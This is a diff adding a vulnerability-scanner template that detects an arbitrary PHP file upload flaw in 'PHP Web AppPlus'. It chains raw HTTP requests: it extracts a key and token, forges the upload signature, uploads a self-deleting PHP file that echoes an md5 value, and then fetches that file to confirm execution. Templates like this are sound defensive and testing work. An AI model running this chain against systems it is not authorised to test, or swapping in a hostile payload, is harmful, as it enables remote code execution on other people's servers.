@@ -1,0 +1,76 @@
+id: phpweb-appplus-php-writefile
+info:
+  name: PHP Web AppPlus PHP File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects a PHP file upload vulnerability in the application that allows arbitrary file upload and execution. A temporary harmless file is uploaded, and its content is verified on the server.
+  reference:
+    - https://xz.aliyun.com/t/7053
+variables:
+  f1: "{{rand_int(40000, 44800)}}"
+  rboundary: "{{rand_text_alpha(8)}}"
+  randname: "{{rand_text_alpha(6)}}"
+http:
+  - raw:
+      - |
+        POST /base/post.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        act=appcode
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "k=(\\w+)&t=(\\d+)"
+    extractors:
+      - type: regex
+        name: key
+        group: 1
+        regex:
+          - "k=(\\w+)&t=(\\d+)"
+        internal: true
+      - type: regex
+        name: token
+        group: 2
+        regex:
+          - "k=(\\w+)&t=(\\d+)"
+        internal: true
+  - raw:
+      - |
+        POST /base/appplus.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+
+        ------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name="file"; filename="{{randname}}.php"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo md5({{f1}});unlink(__FILE__);?>\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name="act"\r\n\nupload\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name="r_size"\r\n\n41\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name="t"\r\n\n{{token}}\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name="m"\r\n\n{{md5(concat(key, token))}}\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name="path"\r\n\nupload\r\n------WebKitFormBoundary{{rboundary}}--\r\n
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "upload/(\\w+.php)"
+    extractors:
+      - type: regex
+        name: fname
+        group: 1
+        regex:
+          - "upload/(\\w+.php)"
+        internal: true
+  - raw:
+      - |
+        GET /upload/{{fname}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{md5(to_string(f1))}}"
